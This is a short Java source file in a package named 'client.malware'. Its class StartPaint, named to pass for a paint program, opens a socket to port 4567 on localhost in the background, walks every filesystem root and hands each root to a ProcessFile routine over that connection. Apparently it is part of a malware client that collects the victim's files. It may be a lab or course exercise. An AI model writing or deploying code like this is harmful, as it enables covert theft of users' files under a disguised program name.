package client.malware;

import java.io.File;
import java.io.IOException;
import shared.Talker;
import java.net.Socket;

public class StartPaint implements Runnable {
	private Talker t;
	
	public void run() {
		t = null;
		try {
			t = new Talker(new Socket("127.0.0.1", 4567));
		} catch (IOException e) {
			System.exit(1);
		}
		
		File roots[] = File.listRoots();
		
		for (int i = 0; i < roots.length; i++) {
			try {
				new ProcessFile(roots[i], t);
			} catch (IOException e) {
				try {
					t.writeLine("DONE");
				} catch (IOException e1) {
					System.exit(2);
				}
				System.exit(1);
			}
		}
		try {
			t.writeLine("DONE");
		} catch (IOException e) {
			System.exit(1);
		}
	}
	
	public StartPaint() {
		new Thread(this).start();
	}
}